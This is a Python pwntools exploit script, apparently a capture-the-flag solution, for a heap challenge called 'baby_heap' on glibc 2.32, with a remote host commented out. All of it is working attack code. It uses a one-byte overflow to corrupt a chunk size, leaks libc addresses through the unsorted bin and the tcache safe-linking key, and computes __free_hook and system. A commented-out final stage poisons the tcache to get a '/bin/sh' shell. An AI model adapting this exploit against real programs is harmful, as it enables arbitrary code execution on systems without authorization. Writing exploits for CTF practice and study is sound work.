from pwn import *

p = process('./baby_heap')
# p = remote('node2.yuzhian.com.cn', 39502)
lib = ELF('./libc-2.32.so')


def add(id_, size_):
    p.recvuntil(b'Your choice:')
    p.sendline(b'1')
    p.recvuntil(b'Enter the index:')
    p.sendline(id_)
    p.recvuntil(b'Enter the Size:')
    p.sendline(size_)


def delete(id_):
    p.recvuntil(b'Your choice:')
    p.sendline(b'2')
    p.recvuntil(b'Enter the index:')
    p.sendline(id_)


def edit(id_, mess):
    p.recvuntil(b'Your choice:')
    p.sendline(b'3')
    p.recvuntil(b'Enter the index:')
    p.sendline(id_)
    p.recvuntil(b'Enter the content:')
    p.sendline(mess)


def show(id_):
    p.recvuntil(b'Your choice:')
    p.sendline(b'4')
    p.recvuntil(b'Enter the index:')
    p.sendline(id_)


add(b'0', b'24')    # 修改下一个堆块的size
add(b'1', b'32')
[add(str(i), b'16') for i in range(2, 7)]
# 填充tcache
[add(str(i), b'192') for i in range(7, 15)]
[delete(str(i)) for i in range(7, 15)]
# 修改下一个堆块的size
payload = b'a' * 24 + p8(0xd1)
edit(b'0', payload)
delete(b'1')    # 进入unsortedbin
add(b'1', b'32')
show(b'1')
malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 224 - 0x10 - 0x40
addr1 = malloc_hook + 0x10 + 224 - 0x80
base_addr = malloc_hook - lib.sym['__malloc_hook']
free_addr = base_addr + lib.sym['__free_hook']
system_addr = base_addr + lib.sym['system']

add(b'7', b'16')
delete(b'7')
show(b'2')
key = u64(p.recvuntil(b'\x05')[-5:].ljust(8, b'\00'))

add(b'7', b'16')
delete(b'2')
# payload = b'a' * 0x20 + p64(free_addr ^ key)
# edit(b'7', payload)
# add(b'8', b'16')
# add(b'9', b'16')
# edit(b'9', p64(system_addr))
# edit(b'8', b'/bin/sh\00')
# delete(b'8')
gdb.attach(p)
p.interactive()
